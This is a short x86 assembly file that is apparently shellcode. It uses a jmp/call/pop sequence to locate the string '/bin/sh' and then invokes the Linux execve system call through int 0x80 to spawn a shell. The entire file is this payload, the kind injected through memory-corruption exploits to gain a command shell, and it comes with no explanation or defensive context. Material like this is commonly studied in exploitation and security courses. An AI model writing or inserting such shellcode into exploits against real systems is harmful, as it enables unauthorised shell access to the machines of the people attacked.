.global _start
.section .text
_start: 
	jmp msg
next:
	// execve /bin/sh
	pop %ebx
	mov $11, %eax
	xor %ecx, %ecx
	xor %edx, %edx
	int $0x80
msg:
	call next
.asciz "/bin/sh"
